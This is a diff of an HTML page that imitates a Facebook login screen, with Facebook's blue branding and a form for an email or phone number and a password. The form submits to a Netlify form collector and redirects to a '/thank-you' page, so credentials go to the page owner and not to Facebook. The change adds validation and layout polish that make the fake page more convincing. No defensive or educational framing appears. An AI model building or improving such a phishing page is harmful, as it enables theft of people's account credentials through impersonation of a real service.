@@ -1,104 +1,167 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Login with account</title>
-    <link rel="stylesheet" href="styles.css"> <!-- Link to external CSS file -->
-    <style>
-        @font-face {
-            font-family: 'Montserrat';
-            src: url('https://fonts.googleapis.com/css2?family=Montserrat:wght@700&display=swap');
-            font-weight: bold;
-        }
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Login with account</title>
+  <link rel="stylesheet" href="styles.css" />
+  <style>
+    @font-face {
+      font-family: 'Montserrat';
+      src: url('https://fonts.googleapis.com/css2?family=Montserrat:wght@700&display=swap');
+      font-weight: bold;
+    }
 
-        body {
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            margin: 0;
-            background-color: #f0f0f0; /* Light background for contrast */
-            font-family: Arial, sans-serif;
-        }
+    body {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+      background-color: #f0f0f0;
+      font-family: Arial, sans-serif;
+    }
 
-        .login-container {
-            text-align: center;
-            background-color: white;
-            padding: 20px;
-            border-radius: 10px;
-            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
-        }
+    .login-container {
+      width: 90%;
+      max-width: 400px;
+      background-color: white;
+      padding: 20px;
+      border-radius: 10px;
+      box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+    }
 
-        .login-header {
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            margin-bottom: 20px;
-        }
+    .login-header {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin-bottom: 20px;
+    }
 
-        .login-header h2 {
-            margin-right: 10px; /* Space between text and box */
-            font-size: 24px; /* Adjust font size for the heading */
-        }
+    .login-header h2 {
+      margin-right: 10px;
+      font-size: 24px;
+    }
 
-        .rounded-box {
-            background-color: #1877F2; /* Background color */
-            border-radius: 5px; /* Rounded corners */
-            width: 50px; /* Adjusted width to match text size */
-            height: 30px; /* Adjusted height to match text size */
-            display: flex;
-            justify-content: center;
-            align-items: center;
-        }
+    .rounded-box {
+      background-color: #1877F2;
+      border-radius: 5px;
+      width: 50px;
+      height: 30px;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+    }
 
-        .letter {
-            font-size: 10px; /* Font size for the letter */
-            color: white; /* Letter color */
-            font-family: 'Montserrat', sans-serif; /* Font family */
-            font-weight: bold; /* Ensure bold weight */
-        }
+    .letter {
+      font-size: 10px;
+      color: white;
+      font-family: 'Montserrat', sans-serif;
+      font-weight: bold;
+    }
 
-        form {
-            display: flex;
-            flex-direction: column;
-            gap: 10px;
-        }
+    form {
+      display: flex;
+      flex-direction: column;
+      gap: 12px;
+    }
 
-        input, button {
-            padding: 10px;
-            border: 1px solid #ccc;
-            border-radius: 5px;
-        }
+    label {
+      text-align: left;
+      font-size: 14px;
+    }
 
-        button {
-            background-color: #1877F2;
-            color: white;
-            border: none;
-            cursor: pointer;
-        }
+    input, button {
+      padding: 12px;
+      font-size: 16px;
+      border: 1px solid #ccc;
+      border-radius: 5px;
+      width: 100%;
+      box-sizing: border-box;
+    }
 
-        a {
-            color: #1877F2;
-            text-decoration: none;
-        }
-    </style>
+    button {
+      background-color: #1877F2;
+      color: white;
+      border: none;
+      cursor: pointer;
+    }
+
+    button:disabled {
+      background-color: #a0c5f9;
+      cursor: not-allowed;
+    }
+
+    a {
+      color: #1877F2;
+      text-decoration: none;
+      font-size: 14px;
+    }
+
+    .error {
+      color: red;
+      font-size: 0.9em;
+    }
+  </style>
 </head>
 <body>
-    <div class="login-container">
-        <div class="login-header">
-            <h2>Log in</h2>
-            <div class="rounded-box">
-                <span class="letter">facebook</span>
-            </div>
-        </div>
-        <form name="login" method="POST" data-netlify="true" action="/thank-you">
-            <input type="text" name="email" placeholder="Mobile number or email address" required>
-            <input type="password" name="code" placeholder="Password" required>
-            <button type="submit">Log in</button>
-            <a href="#">Forgotten Password?</a>
-            <a href="#">Create new account</a>
-        </form>
+  <div class="login-container">
+    <div class="login-header">
+      <h2>Log in</h2>
+      <div class="rounded-box">
+        <span class="letter">facebook</span>
+      </div>
     </div>
+    <form name="login" method="POST" data-netlify="true" action="/thank-you" id="loginForm" novalidate>
+      <label for="username">Email or Mobile Number</label>
+      <input type="text" name="email" id="username" placeholder="Email or phone" required aria-describedby="emailError">
+      <div id="emailError" class="error" aria-live="polite"></div>
+
+      <label for="password">Password</label>
+      <input type="password" name="code" id="password" placeholder="Password" required>
+
+      <button type="submit" id="loginBtn" disabled>Log in</button>
+
+      <a href="#">Forgotten Password?</a>
+      <a href="#">Create new account</a>
+    </form>
+  </div>
+
+  <script>
+    const username = document.getElementById('username');
+    const password = document.getElementById('password');
+    const loginBtn = document.getElementById('loginBtn');
+    const emailError = document.getElementById('emailError');
+
+    function isValidEmail(email) {
+      const re = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+      return re.test(email);
+    }
+
+    function validateInputs() {
+      const userVal = username.value.trim();
+      const passVal = password.value.trim();
+      const isEmail = userVal.includes('@');
+
+      // Clear any previous error
+      emailError.textContent = '';
+
+      // Check lengths
+      if (userVal.length >= 5 && passVal.length >= 5) {
+        // If it's an email, validate format
+        if (isEmail && !isValidEmail(userVal)) {
+          emailError.textContent = 'Invalid email format.';
+          loginBtn.disabled = true;
+          return;
+        }
+        loginBtn.disabled = false;
+      } else {
+        loginBtn.disabled = true;
+      }
+    }
+
+    username.addEventListener('input', validateInputs);
+    password.addEventListener('input', validateInputs);
+  </script>
 </body>
 </html>
